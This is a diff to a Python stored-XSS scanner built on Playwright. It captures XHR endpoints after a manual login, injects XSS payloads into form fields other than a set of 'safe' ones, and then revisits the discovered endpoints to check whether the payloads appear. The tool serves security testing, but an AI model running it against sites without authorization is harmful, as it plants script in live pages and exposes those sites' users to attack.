@@ -10,15 +10,16 @@ from playwright.sync_api import sync_playwright
 
 class StoredXSSScanner:
     def __init__(self, target_url):
-        self.target_url = urlparse(target_url)._replace(fragment='').geturl()  
+        self.target_url = urlparse(target_url).geturl()  # Keep fragments for scanning
         self.session = requests.Session()
         self.vulnerable_urls = []
         self.payloads = self.generate_numbered_payloads()
         self.encoded_payloads = self.generate_encoded_payloads()
-        self.captured_requests = []  
-        self.cookies = {} 
-        self.safe_fields = {"email", "phone", "password", "username", "dob", "website"} 
-        self.user_inputs = {}  
+        self.captured_requests = []  # Store intercepted requests
+        self.cookies = {}  # Store captured cookies and tokens
+        self.safe_fields = {"email", "phone", "password", "username", "dob", "website"}  # Fields to avoid injecting
+        self.user_inputs = {}  # Store user inputs for required fields
+        self.discovered_endpoints = set()  # Store new discovered URLs including fragments
     
     def generate_numbered_payloads(self):
         base_payloads = [
@@ -39,19 +40,15 @@ class StoredXSSScanner:
     def capture_xhr_requests(self):
         print("[+] Opening browser for manual login. Capturing XHR requests and session tokens...")
         with sync_playwright() as p:
-            browser = p.chromium.launch(headless=False) 
+            browser = p.chromium.launch(headless=False)  # Allow manual login
             context = browser.new_context()
             page = context.new_page()
             
             def intercept_response(response):
                 if response.request.resource_type == "xhr":
                     print(f"[XHR] Captured: {response.url}")
-                    self.captured_requests.append({
-                        "url": response.url,
-                        "headers": response.request.headers,
-                        "method": response.request.method,
-                        "post_data": response.request.post_data
-                    })
+                    self.captured_requests.append(response.url)
+                    self.discovered_endpoints.add(response.url)  # Save for further scanning
             
             page.on("response", intercept_response)
             page.goto(self.target_url, timeout=60000)
@@ -83,36 +80,39 @@ class StoredXSSScanner:
                     if any(keyword in field_name.lower() for keyword in self.safe_fields):
                         if field_name not in self.user_inputs:
                             self.user_inputs[field_name] = input(f"Enter value for {field_name}: ")
-                        field.fill(self.user_inputs[field_name])  
+                        field.fill(self.user_inputs[field_name])  # Fill required fields correctly
                     elif field.is_visible():
-                        field.fill(self.payloads[0])  
+                        field.fill(self.payloads[0])  # Inject XSS payload in vulnerable fields
                 
                 submit_button = form.query_selector("button[type=submit], input[type=submit]")
                 if submit_button:
                     submit_button.click()
                     page.wait_for_timeout(3000)
-                
+            
             browser.close()
     
-    def check_stored_xss_execution(self):
-        print("[+] Crawling site to check for stored XSS execution...")
+    def scan_discovered_endpoints(self):
+        print("[+] Scanning discovered endpoints including fragments...")
         with sync_playwright() as p:
             browser = p.chromium.launch(headless=True)
             context = browser.new_context()
             page = context.new_page()
-            page.goto(self.target_url, timeout=30000)
-            page.wait_for_timeout(5000)
             
-            for payload in self.payloads:
-                if payload in page.content():
-                    print(f"[!!!] Stored XSS triggered on {self.target_url} with payload: {payload}")
+            for endpoint in self.discovered_endpoints:
+                print(f"[+] Checking: {endpoint}")
+                page.goto(endpoint, timeout=30000)
+                page.wait_for_timeout(5000)
+                
+                for payload in self.payloads:
+                    if payload in page.content():
+                        print(f"[!!!] Stored XSS triggered at {endpoint} with payload: {payload}")
             
             browser.close()
     
     def run(self):
-        self.capture_xhr_requests()  
-        self.inject_payload_into_forms()  
-        self.check_stored_xss_execution() 
+        self.capture_xhr_requests()  # Start capturing login tokens first
+        self.inject_payload_into_forms()  # Test forms after login
+        self.scan_discovered_endpoints()  # Check discovered URLs, including fragments
         
 if __name__ == "__main__":
     target = input("Enter target URL: ")
